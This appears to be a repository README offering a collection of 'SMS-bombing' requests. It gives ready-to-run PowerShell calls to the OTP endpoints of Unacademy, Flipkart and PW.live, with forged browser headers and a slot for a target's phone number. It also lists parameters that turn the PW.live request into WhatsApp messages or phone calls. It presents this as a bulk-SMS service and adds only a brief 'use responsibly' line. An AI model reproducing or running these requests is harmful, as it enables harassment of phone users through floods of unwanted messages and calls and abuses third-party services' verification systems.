# Bombing-Api Collection 🚀

A meticulously curated and continuously updated repository of **SMS-bombing APIs** designed for developers to access various services for sending bulk SMS. Explore the collection below and stay tuned for exciting new additions coming soon!

## Unacademy SMS API
This API allows sending OTP requests to phone numbers via the Unacademy platform.

### Usage Example (PowerShell)
```powershell
$uri = "https://unacademy.com/api/v3/user/user_check/?enable-email=true"
$body = @{
    phone        = "<PHONE_NUMBER>"
    country_code = "IN"
    otp_type     = 1
    email        = ""
    send_otp     = $true
    is_un_teach_user = $false
} | ConvertTo-Json

$headers = @{
    "Origin"     = "https://unacademy.com"
    "Referer"    = "https://unacademy.com/"
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "X-Platform" = "0"
}

$response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ContentType "application/json"
$response | ConvertTo-Json -Depth 6
```

## Flipkart OTP Generate API
This API enables sending OTP requests to phone numbers via the Flipkart platform.

### Usage Example (PowerShell)
```powershell
$uri = "https://1.rome.api.flipkart.com/api/7/user/otp/generate"

$body = @{
    loginId = "<PHONE_NUMBER>"   # Must include country code (e.g., +91...)
} | ConvertTo-Json

$headers = @{
    "Origin"         = "https://www.flipkart.com"
    "Referer"        = "https://www.flipkart.com/"
    "User-Agent"     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "X-User-Agent"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop"
    "Accept"         = "*/*"
    "Content-Type"   = "application/json"
    "Sec-Fetch-Site" = "same-site"
    "Sec-Fetch-Mode" = "cors"
    "Sec-Fetch-Dest" = "empty"
    "Sec-Ch-Ua"      = "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\""
    "Sec-Ch-Ua-Mobile" = "?0"
    "Sec-Ch-Ua-Platform" = "\"Windows\""
}

$response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ContentType "application/json"
$response | ConvertTo-Json -Depth 6
```

## PW.live (Penpencil) OTP Resend API
This API facilitates resending OTP requests to phone numbers via the PW.live platform.

### Usage Example (PowerShell)
```powershell
$uri = "https://api.penpencil.co/v1/users/resend-otp?smsType=0"

$body = @{
    mobile         = "<PHONE_NUMBER>"        # Replace with user’s mobile number
    organizationId = "5eb393ee95fab7468a79d189"
} | ConvertTo-Json

$headers = @{
    "Origin"         = "https://www.pw.live"
    "Referer"        = "https://www.pw.live/"
    "User-Agent"     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
    "Sec-Ch-Ua"      = "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\""
    "Sec-Ch-Ua-Mobile" = "?0"
    "Sec-Ch-Ua-Platform" = "\"Windows\""
    "Content-Type"   = "application/json"
    "Accept"         = "*/*"
    "Accept-Language" = "en-GB,en;q=0.9"
    "Sec-Fetch-Site" = "cross-site"
    "Sec-Fetch-Mode" = "cors"
    "Sec-Fetch-Dest" = "empty"
    "Randomid"       = "2ade3b08-62fe-4507-9440-3b361783061c"   # This looks like a UUID; you may regenerate dynamically
}

$response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ContentType "application/json"
$response | ConvertTo-Json -Depth 6
```

### Uses
- `smsType=0`: Sends OTP via SMS
- `smsType=1`: Sends OTP via WhatsApp
- `smsType=2`: Sends OTP via Call

## What's Next?
- More APIs will be added soon to expand your options for bulk SMS services.
- Stay updated for enhanced documentation and additional examples.

*Note*: Use these APIs responsibly and in compliance with applicable laws and terms of service.
